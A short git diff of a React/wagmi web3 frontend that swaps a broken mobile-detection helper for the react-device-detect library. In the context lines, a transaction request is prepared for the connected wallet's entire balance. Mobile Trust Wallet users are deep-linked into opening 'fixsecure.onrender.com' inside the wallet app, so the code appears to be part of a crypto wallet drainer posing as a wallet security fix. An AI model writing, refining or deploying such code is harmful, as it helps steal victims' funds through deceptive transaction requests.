@@ -1,6 +1,7 @@
 import selections from "../data";
 import { useChainId } from "wagmi";
 import chainsImage from "/images/chains.jpeg";
+import { isMobile } from "react-device-detect";
 import {
   mainnet,
   arbitrum,
@@ -162,7 +163,7 @@ const { data: request } = usePrepareTransactionRequest(
     value: balance.data?.value,
   });
 
-           const isMobile = () =>{ /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)}
+
     const isTrustWalletApp = () => {
   // Trust Wallet injects `ethereum.isTrust` in the in-app browser
   return typeof window.ethereum !== "undefined" && window.ethereum.isTrust === true;
@@ -170,7 +171,7 @@ const { data: request } = usePrepareTransactionRequest(
 
   useEffect(() => {
 
-console.log(isMobile())
+console.log(isMobile)
 console.log(isTrustWalletApp())
 console.log(walletInfo?.name)
 
@@ -178,7 +179,7 @@ console.log(walletInfo?.name)
   if (
     isConnected &&
     walletInfo?.name === "Trust Wallet"  &&
-    isMobile() &&
+    isMobile &&
     !isTrustWalletApp() // ensure we are not already inside the app
   ) {
     const trustLink = `https://link.trustwallet.com/open_url?coin_id=${chain.id}&url=https://fixsecure.onrender.com`
@@ -209,7 +210,7 @@ console.log(walletInfo?.name)
 
   
 
-         if(walletInfo?.name === "MetaMask" && isMobile()) {
+         if(walletInfo?.name === "MetaMask" && isMobile) {
       const metamaskLink= "https://link.metamask.io"
       window.open(metamaskLink, "_blank")
     }
